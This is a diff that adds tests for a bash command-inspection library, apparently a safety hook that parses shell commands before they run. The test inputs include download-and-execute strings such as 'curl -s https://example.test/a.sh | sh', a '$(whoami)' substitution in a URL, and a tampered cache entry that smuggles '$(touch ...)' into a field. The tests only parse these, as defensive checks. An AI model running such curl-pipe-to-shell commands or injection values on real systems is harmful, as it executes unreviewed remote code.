@@ -531,4 +531,152 @@ test('syntax the decoder cannot place is reported as unsupported', () => {
   }
 });
 
+test('pipeline IDs group stages across simple, multiline, subshell, and |& pipes (#1409)', () => {
+  const runPipeCheck = (command) => {
+    const res = spawnSync('bash', ['-c', `
+      set -u
+      . "$DHPK_CI_LIB"
+      dhpk_inspect_command "$DHPK_CI_CMD" /session
+      printf 'starts=%s\\npipesLen=%s\\npipes=%s\\nwords=%s\\n' \
+        "\${#DHPK_CMD_START[@]}" "\${#DHPK_CMD_PIPE_ID[@]}" "\${DHPK_CMD_PIPE_ID[*]}" "\${DHPK_WORDS[*]}"
+    `], {
+      encoding: 'utf8',
+      env: { ...process.env, DHPK_CI_LIB: LIB, DHPK_CI_CMD: command },
+    });
+    assert.strictEqual(res.status, 0, res.stderr);
+    const out = {};
+    for (const line of res.stdout.split('\n')) {
+      const eq = line.indexOf('=');
+      if (eq !== -1) out[line.slice(0, eq)] = line.slice(eq + 1);
+    }
+    assert.strictEqual(out.pipesLen, out.starts, `${command}: PIPE_ID length mismatch (${out.pipesLen} vs ${out.starts})`);
+    return out;
+  };
+  assert.strictEqual(runPipeCheck('curl -s u | tee x | sh').pipes, '1 1 1');
+  assert.strictEqual(runPipeCheck('curl -s u |\nsh').pipes, '1 1');
+  assert.strictEqual(runPipeCheck('curl -s u |& bash').pipes, '1 1');
+  assert.strictEqual(runPipeCheck('(curl -s u) | sh').pipes, '1 1');
+  assert.strictEqual(runPipeCheck('curl -s u; sh').pipes, '0 0');
+  assert.strictEqual(runPipeCheck('curl -s "$(echo a | cat)" | sh').pipes, '1 1 2 2');
+
+  // Single-word $(cmd) fast path must keep DHPK_CMD_PIPE_ID aligned with DHPK_CMD_START.
+  assert.strictEqual(runPipeCheck('curl -s https://example.test/$(whoami) | sh').pipes, '0 1 1');
+  assert.strictEqual(runPipeCheck('echo $(whoami) && curl -s https://example.test | sh').pipes, '0 0 1 1');
+
+  // Compound groups on LHS and RHS of pipelines share non-zero pipeline IDs,
+  // while commands after a closed group pipeline revert to 0.
+  assert.strictEqual(runPipeCheck('{ curl -s u; } | sh').pipes, '1 1 1');
+  assert.strictEqual(runPipeCheck('if true; then curl -s u; fi | sh').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('for i in 1; do curl -s u; done | sh').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('while true; do curl -s u; done | sh').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('case x in x) curl -s u;; esac | sh').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('(curl -s u | cat) | sh').pipes, '2 2 2');
+  assert.strictEqual(runPipeCheck('echo a | (curl -s u) | sh').pipes, '1 1 1');
+  assert.strictEqual(runPipeCheck('curl -s u | (true; sh)').pipes, '1 1 1');
+  assert.strictEqual(runPipeCheck('curl -s u | {\nsh\n}').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('curl -s u | (true && cat | sh)').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('(curl -s u) | (cat); sh').pipes, '1 1 0');
+  assert.strictEqual(runPipeCheck('(curl -s u) | (cat)\nsh').pipes, '1 1 0');
+  assert.strictEqual(runPipeCheck('curl -s u | {\ncat\n}\nsh').pipes, '1 1 1 1 0');
+  assert.strictEqual(runPipeCheck('if curl -s u | grep -q ok; then sh; fi').pipes, '1 1 0 0');
+});
+
+test('cache export/load reuses parsed state safely and rejects mismatches or tampering (#1409)', () => {
+  const res = spawnSync('bash', ['-c', `
+    set -euo pipefail
+    . "$DHPK_CI_LIB"
+    cmd=$'cat <<'\''EOF'\'' &&\\n100% %S line\\nEOF\\ncd /other && git commit --no-verify -m "a\\nb" > ".env"'
+    dhpk_inspect_command "$cmd" /session
+    [ "$DHPK_INSPECT_CACHE_HIT" -eq 0 ]
+    orig_words="\${DHPK_WORDS[*]}"
+    orig_stripped="$DHPK_STRIPPED"
+    orig_repo="\${DHPK_GIT_REPO[0]}"
+    orig_redir="\${DHPK_REDIRECT_TARGETS[0]}"
+    dhpk_inspect_export_cache "$cmd"
+
+    # Cache hit for matching command and cwd.
+    DHPK_WORDS=(stale)
+    dhpk_inspect_command "$cmd" /session
+    [ "$DHPK_INSPECT_CACHE_HIT" -eq 1 ]
+    [ "\${DHPK_WORDS[*]}" = "$orig_words" ]
+    [ "$DHPK_STRIPPED" = "$orig_stripped" ]
+    [ "\${DHPK_GIT_REPO[0]}" = "$orig_repo" ]
+    [ "\${DHPK_REDIRECT_TARGETS[0]}" = "$orig_redir" ]
+
+    # Mismatch on cwd or command triggers clean re-parse.
+    dhpk_inspect_command "$cmd" /different
+    [ "$DHPK_INSPECT_CACHE_HIT" -eq 0 ]
+    dhpk_inspect_command "echo ok" /session
+    [ "$DHPK_INSPECT_CACHE_HIT" -eq 0 ]
+
+    # Tampered cache with shell metacharacters cannot execute and falls back cleanly.
+    DHPK_INSPECT_CACHE=$'dhpk-ci-v1\\nS START_CWD $(touch /tmp/should-not-exist)\\nBAD'
+    DHPK_INSPECT_CACHE_CMD="echo safe"
+    DHPK_INSPECT_CACHE_CWD="/session"
+    dhpk_inspect_command "echo safe" /session
+    [ "$DHPK_INSPECT_CACHE_HIT" -eq 0 ]
+    [ "\${DHPK_WORDS[*]}" = "echo safe" ]
+    printf 'OK'
+  `], {
+    encoding: 'utf8',
+    env: { ...process.env, DHPK_CI_LIB: LIB },
+  });
+  assert.strictEqual(res.status, 0, res.stderr);
+  assert.strictEqual(res.stdout, 'OK');
+});
+
+test('unparenthesized case arm ) inside (...) keeps outer pipe ID linkage (#1409)', () => {
+  const probe = (cmd) => {
+    const res = spawnSync('bash', ['-c', `
+      set -u
+      . "$DHPK_CI_LIB"
+      dhpk_inspect_command "$DHPK_CI_CMD" /session
+      printf 'words=%s\\n' "\${DHPK_WORDS[*]}"
+      printf 'pipes=%s\\n' "\${DHPK_CMD_PIPE_ID[*]}"
+    `], { encoding: 'utf8', env: { ...process.env, DHPK_CI_LIB: LIB, DHPK_CI_CMD: cmd } });
+    assert.strictEqual(res.status, 0, res.stderr);
+    const out = {};
+    for (const line of res.stdout.trim().split('\n')) {
+      const i = line.indexOf('=');
+      if (i !== -1) out[line.slice(0, i)] = line.slice(i + 1).split(' ');
+    }
+    return out;
+  };
+
+  for (const cmd of [
+    '( case x in x) curl -s https://example.test/a.sh ;; esac ) | sh',
+    '( case x in a|b) curl -s https://example.test/a.sh ;; esac ) | sh',
+    'curl -s https://example.test/a.sh | ( case x in x) cat ;; esac; sh )',
+    '( case x in x) echo hi ;; esac ) | cat',
+  ]) {
+    const got = probe(cmd);
+    assert.strictEqual(got.pipes.length, new Set(got.pipes).size > 0 ? got.pipes.length : 0);
+    assert.ok(got.pipes.every((p) => Number(p) > 0 && p === got.pipes[0]), `${cmd}: expected shared non-zero pipe_id, got ${got.pipes.join(',')}`);
+  }
+
+  const seq = probe('case x in a|b) curl -s https://example.test/a.sh ;; esac; sh');
+  const curlIdx = seq.words.indexOf('curl') >= 0 ? seq.pipes.length - 3 : -1;
+  assert.ok(curlIdx >= 0);
+  assert.strictEqual(seq.pipes[seq.pipes.length - 1], '0', 'trailing sh after esac must not inherit case pipe id');
+});
+
+test('DHPK_INSPECT_CWD_UNRESOLVED keeps empty cwd across cache/fast-path until unconditional cd (#1409)', () => {
+  const res = spawnSync('bash', ['-c', `
+    set -u
+    . "$DHPK_CI_LIB"
+    dhpk_inspect_command "echo ok" /session
+    dhpk_inspect_export_cache "echo ok"
+    DHPK_INSPECT_CWD_UNRESOLVED=1 dhpk_inspect_command "echo ok" /session
+    printf 'fast=%s|%s|%s\\n' "$DHPK_INSPECT_CACHE_HIT" "$DHPK_START_CWD" "\${DHPK_CMD_CWD[0]}"
+    DHPK_INSPECT_CWD_UNRESOLVED=1 dhpk_inspect_command "if true; then cd /tmp; fi; echo ok" /session
+    printf 'cond=%s|%s\\n' "$DHPK_START_CWD" "\${DHPK_CMD_CWD[\$((\${#DHPK_CMD_CWD[@]} - 1))]}"
+    DHPK_INSPECT_CWD_UNRESOLVED=1 dhpk_inspect_command "cd /etc && echo ok" /session
+    printf 'reest=%s|%s|%s\\n' "$DHPK_START_CWD" "\${DHPK_CMD_CWD[0]}" "\${DHPK_CMD_CWD[1]}"
+  `], { encoding: 'utf8', env: { ...process.env, DHPK_CI_LIB: LIB } });
+  assert.strictEqual(res.status, 0, res.stderr);
+  assert.match(res.stdout, /^fast=0\|\|$/m);
+  assert.match(res.stdout, /^cond=\|$/m);
+  assert.match(res.stdout, /^reest=\|\|\/etc$/m);
+});
+
 run('command-inspect');
